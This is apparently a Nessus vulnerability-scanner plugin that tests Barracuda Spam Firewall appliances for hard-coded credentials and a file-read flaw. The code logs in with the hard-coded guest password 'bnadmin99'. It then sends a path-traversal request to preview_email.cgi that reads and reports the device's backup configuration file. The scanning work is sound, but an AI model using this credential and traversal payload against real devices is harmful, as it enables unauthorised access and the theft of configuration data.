#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22130);
  script_version("$Revision: 1.27 $");
  script_cvs_date("$Date: 2016/10/07 13:30:46 $");

  script_cve_id(
    "CVE-2006-4000",
    "CVE-2006-4001",
    "CVE-2006-4081",
    "CVE-2006-4082"
  );
  script_bugtraq_id(19276);
  script_osvdb_id(27747, 27748, 27749, 29780);
  script_xref(name:"CERT", value:"199348");

  script_name(english:"Barracuda Spam Firewall Default Credentials");
  script_summary(english:"Tries to authenticate to Barracuda Networks Spam Firewall");

  script_set_attribute(attribute:"synopsis", value:
"A web management console is protected using default credentials.");
  script_set_attribute(attribute:"description", value:
"The firmware version of the Barracuda Spam Firewall detected on the
remote device contains a hard-coded password for the 'guest' user
account.

Additionally, the device reportedly also contains a hard-coded
password for the 'admin' account as well as the device fails to
properly filter user-supplied input to the 'file' parameter of the
'/cgi-bin/preview_email.cgi' script before using it to read files.
Using specially crafted strings, an unauthenticated attacker can
leverage this flaw to read arbitrary files and even execute arbitrary
commands on the remote host.  While the web server executes as the
user 'nobody', it is possible to access several system commands
through the use of 'sudo' and thereby gain root privileges.

Note that Nessus has not tested for the additional issues.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/Aug/116");
  script_set_attribute(attribute:"solution", value:
"Upgrading to firmware version 3.3.0.54 or later reportedly addresses
the issues.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/08/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/08/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:barracuda_networks:barracuda_spam_firewall");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"default_account", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("barracuda_detect.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/www", 8000);
  script_require_keys("www/barracuda_spamfw");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_http_port(default:8000, embedded:TRUE);
get_kb_item_or_exit("www/barracuda_spamfw");

# Extract some parameters from the login screen in preparation for logging in.
url = "/cgi-bin/index.cgi";
r = http_send_recv3(method: "GET", port:port, item: url, exit_on_fail:TRUE);
res = r[2];

params = NULL;
foreach kval (make_list("enc_key", "et"))
{
  pat = string("name=", kval, " value=([^>]+)>");
  matches = egrep(pattern:pat, string:res);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      val = eregmatch(pattern:pat, string:match);
      if (!isnull(val))
      {
        params[kval] = val[1];
        break;
      }
    }
  }
}


# If we got the necessary parameters.
if (!isnull(params) && params['enc_key'] && params['et'])
{
  # Try to log in.
  user = "guest";
  pass = "bnadmin99";
  postdata =
    "real_uer=&" +
    "login_state=out&" +
    "locale=en_US&" +
    "user=" + user + "&" +
    "password=" + pass + "&" +
    "password_entry=&" +
    "enc_key=" + params['enc_key'] + "&" +
    "et=" + params['et'] + "&" +
    "Submit=Login";

  r = http_send_recv3(method: "POST", item: url, port: port,
    content_type: "application/x-www-form-urlencoded",
    data: postdata, exit_on_fail:TRUE);

  # There's a problem if we can login.
  if ("title>Barracuda Spam Firewall: Current Operational Status" >< r[2])
  {
    contents = NULL;

    # If the "Perform thorough tests" setting is enabled...
    if (thorough_tests)
    {
      # Try to retrieve the backup copy of configuration file.
      r = http_send_recv3(method: "GET", port: port,
        item:"/cgi-bin/preview_email.cgi?" +
          "file=/mail/mlog/../tmp/backup/periodic_config.txt.tmp", exit_on_fail:TRUE);
      res = r[2];
      # If it looks successful...
      if ("account_bypass_quarantine" >< res)
      {
        contents = strstr(res, "<pre>");
        if (contents) contents = contents - "<pre>";
        if (contents) contents = contents - strstr(contents, "</pre>");
        if (contents) contents = str_replace(find:"<br> \", replace:"", string:contents);
      }
    }

    if (contents)
      report =
        'Here are the contents of a backup copy of the device\'s configuration\n' +
        'file that Nessus was able to read from the remote host :\n' +
        '\n' + contents;
    else report = NULL;

    security_hole(port:port, extra:report);
    exit(0);
  }
}
audit(AUDIT_LISTEN_NOT_VULN, "Barracuda Spam Firewall", port);
